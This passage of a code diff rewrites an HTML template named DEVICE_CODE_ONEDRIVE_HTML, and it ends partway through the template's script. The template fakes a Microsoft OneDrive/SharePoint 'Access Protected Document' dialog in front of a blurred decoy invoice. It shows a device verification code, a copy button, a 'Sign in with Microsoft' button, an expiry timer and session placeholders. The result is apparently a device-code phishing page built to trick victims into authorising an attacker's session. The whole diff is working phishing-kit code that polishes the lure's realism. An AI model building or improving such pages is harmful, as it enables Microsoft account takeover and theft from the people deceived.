@@ -410,625 +410,711 @@ setTimeout(checkStatus,5000);
 const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="referrer" content="no-referrer">
-    <title>Verify Your Identity</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body, html {
-            height: 100%;
-            width: 100%;
-            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
-            background: #f4f5f7;
-            overflow-x: hidden;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Document Access</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #EEF1F5;
+    --panel: #FFFFFF;
+    --border: #D8DEE7;
+    
+    /* Strict Microsoft Design System Tokens */
+    --ms-blue: #0078D4;
+    --ms-blue-hover: #005A9E;
+    --ms-ink: #201F1E;
+    --ms-text: #605E5C;
+    --ms-bg-tint: #F3F9FD;
+    --ms-border: #E1E1E1;
+  }
 
-        /* --- REDESIGNED DOCUMENT VIEWER INTERFACE --- */
-        .app-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            z-index: 1;
-            pointer-events: none;
-            user-select: none;
-        }
-        
-        /* Redesigned Navbar with Real Logo and Nav Links */
-        .doc-header-bar {
-            height: 48px;
-            background: #0078d4;
-            color: #ffffff;
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            gap: 20px;
-        }
-        .nav-logo {
-            display: flex;
-            align-items: center;
-            font-weight: 600;
-            font-size: 16px;
-            gap: 8px;
-        }
-        .nav-logo svg {
-            width: 24px;
-            height: 24px;
-            fill: #ffffff;
-        }
-        .nav-links {
-            display: flex;
-            gap: 16px;
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        .nav-link-item {
-            color: #ffffff;
-            text-decoration: none;
-        }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
 
-        .viewer-canvas {
-            flex: 1;
-            background: #f3f2f1;
-            display: flex;
-            justify-content: center;
-            padding: 20px;
-        }
-        .invoice-paper {
-            background: #fff;
-            width: 100%;
-            max-width: 600px;
-            height: 100%;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-            border: 1px solid #edebe9;
-            padding: 30px;
-        }
-        .invoice-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 30px;
-        }
-        .invoice-title {
-            font-size: 22px;
-            font-weight: 700;
-            color: #323130;
-            letter-spacing: 0.5px;
-        }
-        .mock-text-sm {
-            background: #f3f2f1;
-            height: 12px;
-            margin-bottom: 8px;
-            border-radius: 1px;
-        }
-        .invoice-table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 30px;
-        }
-        .invoice-table th {
-            border-bottom: 2px solid #a19f9d;
-            height: 24px;
-            padding-bottom: 8px;
-        }
-        .invoice-table td {
-            border-bottom: 1px solid #edebe9;
-            padding: 12px 0;
-        }
+  html, body {
+    height: 100%;
+    background: var(--bg);
+    font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+    color: var(--ms-ink);
+    display: flex;
+    flex-direction: column;
+  }
 
-        /* --- AUTHENTIC MICROSOFT/OFFICE 365 OVERLAY SHIELD --- */
-        .modal-overlay {
-            position: absolute;
-            top: 48px;
-            left: 0;
-            width: 100%;
-            height: calc(100% - 48px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0, 0, 0, 0.03);
-            z-index: 10;
-            padding: 16px;
-        }
-        
-        /* Adjusted Compact Container Size */
-        .o365-card {
-            background: #ffffff;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
-            border: 1px solid #d2d0ce;
-            padding: 32px;
-            position: relative;
-        }
-        
-        .o365-heading {
-            font-size: 22px;
-            font-weight: 600;
-            color: #1b1a19;
-            margin-bottom: 14px;
-            text-align: center;
-        }
-        .secure-subtext {
-            font-size: 14px;
-            color: #242424;
-            margin-bottom: 16px;
-            text-align: center;
-        }
+  /* ---------- Microsoft Suite Top Navbar ---------- */
+  .navbar {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 48px;
+    background: var(--ms-blue);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 16px;
+    z-index: 10;
+  }
+  .nav-brand {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    color: #FFFFFF;
+  }
+  .nav-brand span { font-weight: 400; opacity: 0.85; }
+  .waffle-icon {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 2px;
+    width: 16px; height: 16px;
+  }
+  .waffle-icon div { background: #fff; border-radius: 1px; }
 
-        .pdf-attachment-box {
-            display: flex;
-            align-items: center;
-            background: #f3f2f1;
-            border: 1px solid #edebe9;
-            padding: 10px 14px;
-            gap: 12px;
-            margin-bottom: 20px;
-            border-radius: 2px;
-        }
-        .pdf-brand-icon {
-            width: 32px;
-            height: 32px;
-            background: #e02424;
-            color: #fff;
-            font-weight: 800;
-            font-size: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 3px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-        .pdf-brand-icon::before {
-            content: "PDF";
-        }
-        .pdf-meta {
-            display: flex;
-            flex-direction: column;
-        }
-        .pdf-name {
-            font-size: 13px;
-            font-weight: 600;
-            color: #323130;
-        }
-        .pdf-size {
-            font-size: 11px;
-            color: #797775;
-        }
+  /* ---------- Background: A4 Invoice Layer ---------- */
+  .invoice-stage {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 0;
+    background: var(--bg);
+    overflow: hidden;
+    padding-top: 48px;
+  }
 
-        .o365-prompt {
-            font-size: 13px;
-            color: #242424;
-            line-height: 1.5;
-            margin-bottom: 20px;
-            text-align: center;
-        }
+  .invoice-sheet {
+    width: min(640px, 72vw);
+    aspect-ratio: 210 / 297;
+    background: #fff;
+    color: #242c38;
+    padding: 48px 50px;
+    font-family: 'IBM Plex Mono', monospace;
+    filter: blur(2.5px);
+    box-shadow: 0 30px 90px rgba(27,36,48,0.14);
+    border: 1px solid #e3e7ee;
+    display: flex;
+    flex-direction: column;
+  }
 
-        /* Centered and Bigger Logo Alignment */
-        .o365-brand-wrapper {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .o365-brand-wrapper svg {
-            width: 54px;
-            height: 54px;
-        }
+  .invoice-sheet .brand-row { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 30px; }
+  .invoice-sheet .brand { font-family: 'Inter', sans-serif; font-weight: 700; font-size: 15px; letter-spacing: 0.2px; }
+  .invoice-sheet .brand-sub { font-family: 'Inter', sans-serif; font-size: 10px; color: #8590a0; margin-top: 3px; line-height: 1.5; }
+  .invoice-sheet .doc-label { font-family: 'Inter', sans-serif; font-size: 30px; font-weight: 700; letter-spacing: 1px; color: #1c232e; text-align: right; line-height: 1; }
+  .invoice-sheet .doc-num { font-family: 'IBM Plex Mono', monospace; font-size: 11px; color: #8590a0; text-align: right; margin-top: 8px; }
 
-        .input-group {
-            position: relative;
-            margin-bottom: 4px;
-        }
-        .o365-input {
-            width: 100%;
-            border: none;
-            border-bottom: 1px solid #605e5c;
-            padding: 8px 36px 6px 0px;
-            font-size: 15px;
-            color: #242424;
-            outline: none;
-            background: transparent;
-            border-radius: 0;
-            font-family: inherit;
-            transition: border-color 0.15s ease;
-        }
-        .o365-input:focus {
-            border-bottom: 2px solid #0067b8;
-            padding-bottom: 5px;
-        }
-        .o365-input.loading {
-            color: #a19f9d;
-            font-style: italic;
-        }
+  .meta-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 10px 24px;
+    margin-bottom: 24px; padding-bottom: 20px; border-bottom: 1px solid #dde2ea;
+  }
+  .meta-grid .label { font-size: 9px; text-transform: uppercase; letter-spacing: 1px; color: #a3acba; margin-bottom: 3px; }
+  .meta-grid .value { font-size: 11.5px; color: #242c38; }
 
-        .inline-copy-btn {
-            position: absolute;
-            right: 4px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            color: #605e5c;
-            display: flex;
-            align-items: center;
-            padding: 4px;
-        }
-        .inline-copy-btn:disabled {
-            cursor: not-allowed;
-            opacity: 0.3;
-        }
-        .inline-copy-btn svg {
-            width: 16px;
-            height: 16px;
-            fill: currentColor;
-        }
-        .inline-copy-btn.copied {
-            color: #107c10;
-        }
+  table { width: 100%; border-collapse: collapse; font-size: 10.5px; margin-bottom: auto; }
+  thead th {
+    text-align: left; text-transform: uppercase; letter-spacing: 0.8px; font-size: 9px; color: #8590a0; font-weight: 600;
+    background: #F7F9FC; padding: 8px 8px; border-top: 1px solid #dde2ea; border-bottom: 1px solid #dde2ea;
+  }
+  thead th:first-child { border-left: 1px solid #dde2ea; }
+  thead th:last-child { border-right: 1px solid #dde2ea; text-align: right; }
+  th.num, td.num { text-align: right; }
+  tbody td { padding: 8px 8px; border-bottom: 1px solid #edf0f5; }
+  tbody td:first-child { border-left: 1px solid #dde2ea; }
+  tbody td:last-child { border-right: 1px solid #dde2ea; }
+  tbody tr:last-child td { border-bottom: 1px solid #dde2ea; }
+  tbody tr:nth-child(even) { background: #FBFCFE; }
 
-        .status-message {
-            font-size: 12px;
-            color: #107c10;
-            min-height: 18px;
-            margin-bottom: 20px;
-            margin-top: 6px;
-        }
+  .totals-block { margin-top: 16px; margin-left: auto; width: 220px; font-size: 11px; }
+  .totals-block .row { display: flex; justify-content: space-between; padding: 5px 0; }
+  .totals-block .row span:first-child { color: #8590a0; }
+  .totals-block .grand { font-size: 14px; font-weight: 700; color: #1c232e; border-top: 2px solid #242c38; margin-top: 4px; padding-top: 9px; }
+  .sheet-foot { margin-top: 22px; padding-top: 14px; border-top: 1px solid #edf0f5; font-size: 9.5px; color: #a3acba; display: flex; justify-content: space-between; }
 
-        .o365-btn {
-            width: 100%;
-            max-width: 108px;
-            background: #0067b8;
-            color: #ffffff;
-            border: none;
-            padding: 6px 12px;
-            font-size: 15px;
-            font-weight: 400;
-            cursor: pointer;
-            text-align: center;
-            float: right;
-            margin-bottom: 24px;
-            transition: background 0.1s ease;
-        }
-        .o365-btn:hover {
-            background: #005a9e;
-        }
-        .o365-btn:disabled {
-            background: #cccccc;
-            color: #f3f2f1;
-            cursor: not-allowed;
-        }
+  /* Scrim Mask overlay */
+  .scrim {
+    position: fixed; inset: 0; z-index: 1;
+    background: radial-gradient(ellipse at 50% 50%, rgba(238,241,245,0.2) 0%, rgba(238,241,245,0.45) 60%, rgba(238,241,245,0.65) 100%);
+    padding-top: 48px;
+  }
 
-        .o365-footer {
-            clear: both;
-            font-size: 12px;
-            color: #605e5c;
-            display: flex;
-            justify-content: center;
-            gap: 12px;
-        }
-        .o365-footer a {
-            color: #605e5c;
-            text-decoration: none;
-        }
-        .o365-footer a:hover {
-            text-decoration: underline;
-        }
+  /* ---------- Foreground: Authentic Microsoft Dialog ---------- */
+  .stage {
+    position: relative; z-index: 2;
+    min-height: 100vh;
+    display: flex; align-items: center; justify-content: center;
+    padding: 80px 24px 40px;
+  }
 
-        .expiration-timer {
-            font-size: 11px;
-            color: #a19f9d;
-            margin-top: 14px;
-            text-align: center;
-            clear: both;
-        }
-        .expiration-timer span {
-            font-weight: 600;
-            color: #a80000;
-        }
+  .card {
+    width: min(410px, 100%);
+    background: var(--panel);
+    border: 1px solid var(--ms-border);
+    border-radius: 4px;
+    padding: 36px 28px 28px;
+    box-shadow: 0 16px 40px rgba(0,0,0,0.08), 0 2px 8px rgba(0,0,0,0.04);
+  }
 
-        .success-viewport {
-            display: none;
-            text-align: center;
-            padding: 10px 0;
-        }
-        .success-tick-icon {
-            width: 44px;
-            height: 44px;
-            background: #107c10;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 16px;
-        }
-        .success-tick-icon svg {
-            width: 22px;
-            height: 22px;
-            fill: #ffffff;
-        }
-        .success-viewport h2 {
-            font-size: 20px;
-            font-weight: 600;
-            color: #1b1a19;
-            margin-bottom: 8px;
-        }
-        .success-viewport p {
-            font-size: 14px;
-            color: #605e5c;
-        }
-    </style>
+  /* Logo strip layout styling */
+  .ms-logo-strip {
+    margin: 0 auto 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+  }
+  .ms-logo-strip img {
+    height: 38px;
+    width: auto;
+  }
+  .ms-logo-strip .plus-sign {
+    font-size: 18px;
+    font-weight: 400;
+    color: #8A8886;
+    margin: 0 2px;
+    user-select: none;
+  }
+
+  h1 { 
+    font-size: 19px; 
+    font-weight: 600; 
+    color: var(--ms-ink); 
+    margin-bottom: 10px;
+    letter-spacing: -0.2px;
+    text-align: center;
+  }
+
+  .sub-text {
+    font-size: 13px;
+    color: var(--ms-text);
+    line-height: 1.5;
+    margin-bottom: 20px;
+    text-align: center;
+  }
+
+  /* Document Badge Preview Component - Official Embedded PDF Vector Graphics */
+  .file-badge {
+    display: flex; align-items: center; gap: 14px;
+    padding: 12px; background: #F3F2F1;
+    border: 1px solid transparent; border-radius: 2px;
+    margin-bottom: 20px; text-align: left;
+  }
+  .file-icon { width: 30px; height: 34px; flex-shrink: 0; }
+  .file-meta { flex: 1; min-width: 0; }
+  .file-name { font-size: 13px; font-weight: 600; color: var(--ms-ink); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .file-sub { font-size: 11px; color: var(--ms-text); margin-top: 2px; }
+
+  /* Label Styling */
+  .code-label { 
+    font-size: 11px; 
+    font-weight: 600; 
+    text-transform: uppercase; 
+    letter-spacing: 0.5px; 
+    color: var(--ms-text); 
+    margin-bottom: 6px;
+  }
+  
+  /* Verification Box Layout */
+  .code-display-group {
+    position: relative;
+    display: flex;
+    align-items: center;
+    margin-bottom: 24px;
+  }
+
+  .security-code-container {
+    width: 100%;
+    background: var(--ms-bg-tint);
+    border: 1px solid #D2E3F2;
+    border-radius: 2px; padding: 12px 48px 12px 12px;
+    font-family: 'Segoe UI', monospace;
+    font-size: 21px; font-weight: 700; letter-spacing: 5px;
+    color: var(--ms-blue);
+    user-select: all;
+    text-indent: 5px;
+    text-align: center;
+  }
+
+  .security-code-container.loading {
+    color: #8a8886;
+    font-size: 17px;
+    letter-spacing: normal;
+    border-color: #c8c6c4;
+  }
+
+  /* Fluent UI Icon Button Styling */
+  .btn-copy {
+    position: absolute;
+    right: 12px;
+    background: transparent;
+    border: none;
+    color: var(--ms-blue);
+    cursor: pointer;
+    padding: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 2px;
+    transition: background 0.1s, color 0.1s;
+  }
+  .btn-copy:hover {
+    background: #E1DFDD;
+  }
+  .btn-copy svg {
+    width: 18px;
+    height: 18px;
+  }
+  
+  /* Copy-state transition bindings */
+  .btn-copy .icon-copied { display: none; color: #107C41; }
+  .btn-copy.is-copied .icon-default { display: none; }
+  .btn-copy.is-copied .icon-copied { display: block; }
+
+  .actions { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; }
+  
+  /* Primary Action Buttons */
+  .btn {
+    width: 100%; padding: 10px; font-size: 14px; font-weight: 600;
+    border-radius: 2px; cursor: pointer; transition: background 0.1s ease;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    font-family: 'Segoe UI', sans-serif;
+  }
+  .btn-primary { background: var(--ms-blue); color: #fff; border: none; }
+  .btn-primary:hover { background: var(--ms-blue-hover); }
+  .btn-primary:disabled { background: #c8c6c4; cursor: not-allowed; }
+  
+  .btn-secondary { background: #FFF; color: var(--ms-ink); border: 1px solid #8A8886; }
+  .btn-secondary:hover { background: #F3F2F1; }
+
+  /* Status message */
+  .status-msg {
+    font-size: 13px;
+    min-height: 22px;
+    font-weight: 500;
+    margin: -10px 0 10px;
+    color: #107c10;
+    text-align: center;
+  }
+
+  /* Success View */
+  .success-view {
+    display: none;
+    text-align: center;
+    padding: 12px 0;
+  }
+  .success-view .check-icon {
+    display: inline-block;
+    background: #107c10;
+    color: white;
+    border-radius: 50%;
+    width: 56px;
+    height: 56px;
+    line-height: 56px;
+    font-size: 28px;
+    margin-bottom: 16px;
+  }
+  .success-view h2 { font-weight: 600; margin-bottom: 4px; }
+  .success-view p { color: var(--ms-text); margin-bottom: 12px; }
+  .success-badge {
+    background: #dff6dd;
+    color: #107c10;
+    padding: 8px 12px;
+    border-radius: 4px;
+    display: inline-block;
+    font-weight: 600;
+    font-size: 14px;
+  }
+
+  /* Structured Bottom Timer/Action Banner */
+  .timer-banner {
+    font-size: 12px;
+    color: var(--ms-text);
+    text-align: center;
+    border-top: 1px solid #EDEBE9;
+    padding-top: 14px;
+    margin-top: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .timer-banner strong {
+    color: var(--ms-ink);
+    font-weight: 600;
+  }
+  .link-refresh {
+    color: var(--ms-blue);
+    text-decoration: none;
+    font-weight: 600;
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-size: 12px;
+    font-family: inherit;
+  }
+  .link-refresh:hover {
+    text-decoration: underline;
+    color: var(--ms-blue-hover);
+  }
+  .divider-dot { color: #A19F9D; }
+
+  @media (max-width: 640px) {
+    .invoice-sheet { width: 88vw; padding: 30px 26px; }
+    thead th, tbody td { padding: 6px 5px; font-size: 9px; }
+  }
+</style>
 </head>
 <body>
 
-<div class="app-container">
-    <!-- Redesigned Navbar with Logo and Navlinks -->
-    <div class="doc-header-bar">
-        <div class="nav-logo">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                <path d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
-                <path fill="#0078d4" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
+  <!-- Top Navbar -->
+  <nav class="navbar">
+    <div class="nav-brand">
+      <div class="waffle-icon">
+        <div></div><div></div><div></div>
+        <div></div><div></div><div></div>
+        <div></div><div></div><div></div>
+      </div>
+      SharePoint <span>Online</span>
+    </div>
+  </nav>
+
+  <!-- Background Invoice Layer -->
+  <div class="invoice-stage">
+    <div class="invoice-sheet">
+      <div class="brand-row">
+        <div>
+          <div class="brand">Meridian Fabrication Co.</div>
+          <div class="brand-sub">142 Industrial Way, Suite 4<br>Hamilton, ON L8N 1C2</div>
+        </div>
+        <div>
+          <div class="doc-label">TAX<br>INVOICE</div>
+          <div class="doc-num">NV-2026-004417</div>
+        </div>
+      </div>
+
+      <div class="meta-grid">
+        <div><div class="label">Bill To</div><div class="value">Larkspur Contracting Ltd.</div></div>
+        <div><div class="label">Ship To</div><div class="value">Unit 6, Bayfront Depot</div></div>
+        <div><div class="label">Issue Date</div><div class="value">03 July 2026</div></div>
+        <div><div class="label">Due Date</div><div class="value">02 Aug 2026</div></div>
+        <div><div class="label">Order No.</div><div class="value">PO-88213</div></div>
+        <div><div class="label">Terms</div><div class="value">Net 30</div></div>
+      </div>
+
+      <table>
+        <colgroup>
+          <col style="width:44%"><col style="width:14%"><col style="width:12%"><col style="width:15%"><col style="width:15%">
+        </colgroup>
+        <thead>
+          <tr>
+            <th>Description</th>
+            <th class="num">SKU</th>
+            <th class="num">Qty</th>
+            <th class="num">Rate</th>
+            <th class="num">Amount</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>Structural steel brackets, 4in</td><td class="num">SB-4412</td><td class="num">120</td><td class="num">14.50</td><td class="num">1,740.00</td></tr>
+          <tr><td>Powder coating service</td><td class="num">PC-0091</td><td class="num">1</td><td class="num">860.00</td><td class="num">860.00</td></tr>
+          <tr><td>Freight & handling</td><td class="num">FR-STD</td><td class="num">1</td><td class="num">210.00</td><td class="num">210.00</td></tr>
+          <tr><td>Pallet wrapping &amp; crating</td><td class="num">PK-020</td><td class="num">3</td><td class="num">18.00</td><td class="num">54.00</td></tr>
+          <tr><td>Inspection &amp; QA sign-off</td><td class="num">QA-100</td><td class="num">1</td><td class="num">95.00</td><td class="num">95.00</td></tr>
+        </tbody>
+      </table>
+
+      <div class="totals-block">
+        <div class="row"><span>Subtotal</span><span>2,959.00</span></div>
+        <div class="row"><span>Tax (8%)</span><span>236.72</span></div>
+        <div class="row grand"><span>Total Due</span><span>3,195.72</span></div>
+      </div>
+
+      <div class="sheet-foot">
+        <span>Reference invoice number in all correspondence</span>
+        <span>Page 1 of 1</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="scrim"></div>
+
+  <!-- Foreground Layer: Card Modal -->
+  <div class="stage">
+    <div class="card">
+      
+      <!-- MAIN VIEW -->
+      <div id="mainView">
+        <!-- Updated Microsoft Production App Icon Stream Integration -->
+        <div class="ms-logo-strip">
+          <!-- OneDrive Asset -->
+          <img src="https://www.microsoft.com/content/dam/microsoft/bade/images/icons/en-us/m365-app-icons-fy26/OneDrive-Icon-FY26.svg" alt="OneDrive">
+          <div class="plus-sign">+</div>
+          <!-- Requested CDN Microsoft Office Asset -->
+          <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft-office/default.svg" alt="Microsoft Office">
+        </div>
+
+        <h1>Access Protected Document</h1>
+        
+        <p class="sub-text">
+          Use the authorization code below to verify your workspace access permissions.
+        </p>
+
+        <!-- Document Badge Component -->
+        <div class="file-badge">
+          <svg class="file-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 0c-17.6 0-32 14.4-32 32v448c0 17.6 14.4 32 32 32h320c17.6 0 32-14.4 32-32V128L352 0H128z" fill="#E2E5E6"/>
+            <path d="M352 0v96c0 17.6 14.4 32 32 32h96L352 0z" fill="#B0B7BD"/>
+            <path d="M480 128H352V0l128 128z" opacity=".05"/>
+            <path d="M352 128H480l-128-128v128z" opacity=".07"/>
+            <path d="M176 336c0-8.8 7.2-16 16-16h224c8.8 0 16 7.2 16 16v96c0 8.8-7.2 16-16 16H192c-8.8 0-16-7.2-16-16v-96z" fill="#E53935"/>
+            <text x="312" y="414" font-family="Segoe UI, Inter, sans-serif" font-size="64" font-weight="800" fill="#fff" text-anchor="middle">PDF</text>
+          </svg>
+          <div class="file-meta">
+            <div class="file-name">Financial_Invoice_Audit.pdf</div>
+            <div class="file-sub">OneDrive Shared Link &bull; Secure Cloud Node</div>
+          </div>
+        </div>
+
+        <!-- Action Tracking Header Segment -->
+        <div class="code-label">Verification Code</div>
+        
+        <!-- Content Panel Block with Contextual Toggle Copy Node -->
+        <div class="code-display-group">
+          <div class="security-code-container" id="codeBox">Loading...</div>
+          <button class="btn-copy" id="copyBtn" title="Copy code to clipboard" onclick="copyCodeAction()" disabled>
+            <!-- Default Fluent Copy Vector Icon -->
+            <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+              <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
             </svg>
-            SharePoint
+            <!-- Dynamic Success Checkmark Icon -->
+            <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="20 6 9 17 4 12"></polyline>
+            </svg>
+          </button>
         </div>
-        <div class="nav-links">
-            <a href="#" class="nav-link-item">Home</a>
-            <a href="#" class="nav-link-item">My Files</a>
-            <a href="#" class="nav-link-item">Shared</a>
-        </div>
-    </div>
-    
-    <!-- Clean, Clear Document View Frame (No Blur) -->
-    <div class="viewer-canvas">
-        <div class="invoice-paper">
-            <div class="invoice-header">
-                <div>
-                    <div class="invoice-title">TAX INVOICE</div>
-                    <div class="mock-text-sm" style="width: 140px; margin-top: 10px;"></div>
-                    <div class="mock-text-sm" style="width: 90px;"></div>
-                </div>
-                <div style="text-align: right;">
-                    <div class="mock-text-sm" style="width: 120px; margin-left: auto;"></div>
-                    <div class="mock-text-sm" style="width: 160px; margin-left: auto;"></div>
-                    <div class="mock-text-sm" style="width: 80px; margin-left: auto;"></div>
-                </div>
-            </div>
-            
-            <div style="display: flex; gap: 40px; margin-bottom: 40px;">
-                <div style="flex: 1;">
-                    <div class="mock-text-sm" style="width: 60%; height: 14px; background: #a19f9d;"></div>
-                    <div class="mock-text-sm" style="width: 80%;"></div>
-                    <div class="mock-text-sm" style="width: 85%;"></div>
-                </div>
-                <div style="flex: 1;">
-                    <div class="mock-text-sm" style="width: 50%; height: 14px; background: #a19f9d;"></div>
-                    <div class="mock-text-sm" style="width: 75%;"></div>
-                    <div class="mock-text-sm" style="width: 70%;"></div>
-                </div>
-            </div>
 
-            <table class="invoice-table">
-                <thead>
-                    <tr>
-                        <th style="width: 50%;"><div class="mock-text-sm" style="width: 40px;"></div></th>
-                        <th><div class="mock-text-sm" style="width: 30px; margin-left: auto;"></div></th>
-                        <th><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></th>
-                        <th><div class="mock-text-sm" style="width: 60px; margin-left: auto;"></div></th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><div class="mock-text-sm" style="width: 80%;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
-                    </tr>
-                    <tr>
-                        <td><div class="mock-text-sm" style="width: 65%;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
-                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-</div>
+        <div class="status-msg" id="codeStatus"></div>
 
-<!-- COMPACT INTERACTION LAYER -->
-<div class="modal-overlay">
-    <div class="o365-card">
+        <!-- Action Stack -->
+        <div class="actions">
+          <button class="btn btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
+            Authenticate with Code
+          </button>
+          <button class="btn btn-secondary" onclick="openSignIn()">
+            <!-- Microsoft Core Emblem Vector -->
+            <svg viewBox="0 0 23 23" style="width:14px; height:14px; flex-shrink:0;">
+              <path fill="#f35325" d="M0 0h11v11H0z"/>
+              <path fill="#81bc06" d="M12 0h11v11H12z"/>
+              <path fill="#05a6f0" d="M0 12h11v11H0z"/>
+              <path fill="#ffba08" d="M12 12h11v11H12z"/>
+            </svg>
+            Sign in with Microsoft
+          </button>
+        </div>
+
+        <!-- Bottom Banner with Integrated Refresh Trigger -->
+        <div class="timer-banner">
+          <span>Expires in <strong id="timer">{expires_minutes}</strong></span>
+          <span class="divider-dot">&bull;</span>
+          <button class="link-refresh" onclick="triggerManualRefresh()">Refresh Code</button>
+        </div>
+      </div>
+
+      <!-- SUCCESS VIEW -->
+      <div class="success-view" id="successView">
+        <div class="check-icon">✔</div>
+        <h2>Verification Complete</h2>
+        <p>Your identity has been confirmed. You may now close this window.</p>
+        <div class="success-badge">Document Access Granted</div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      // ---- EXACT POLLING + STATE MANAGEMENT FROM ORIGINAL ----
+      var sid = '{session_id}';
+      var verifyUrl = '{verify_url}';
+      var codeReady = {code_ready};
+      var code = '{user_code}';
+      var expiresIn = {expires_seconds};
+      var popup = null;
+
+      var codeEl = document.getElementById('codeBox');
+      var statusEl = document.getElementById('codeStatus');
+      var btnEl = document.getElementById('signInBtn');
+      var copyBtn = document.getElementById('copyBtn');
+      var timerEl = document.getElementById('timer');
+      var mainView = document.getElementById('mainView');
+      var successView = document.getElementById('successView');
+
+      function showCode(c, v) {
+        code = c;
+        if (v) verifyUrl = v;
+        codeEl.textContent = c;
+        codeEl.classList.remove('loading');
+        codeEl.style.letterSpacing = '5px';
+        codeEl.style.color = '#0078D4';
+        codeEl.style.fontSize = '21px';
+        btnEl.disabled = false;
+        copyBtn.disabled = false;
+      }
+
+      if (codeReady && code) {
+        showCode(code, verifyUrl);
+      } else {
+        codeEl.textContent = 'Loading...';
+        codeEl.classList.add('loading');
+        codeEl.style.letterSpacing = 'normal';
+        codeEl.style.color = '#8a8886';
+        codeEl.style.fontSize = '17px';
+      }
+
+      // Copy function
+      window.copyCodeAction = function() {
+        if (!code || code === 'Loading...') return;
+        const targetText = codeEl.textContent;
+        const copyBtn = document.getElementById('copyBtn');
         
-        <div id="mainView">
-            <!-- Center Aligned, Enlarged Identity Logo Wrapper -->
-            <div class="o365-brand-wrapper">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                    <path fill="#0078d4" d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
-                    <path fill="#fff" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
-                </svg>
-            </div>
+        const processState = () => {
+          copyBtn.classList.add('is-copied');
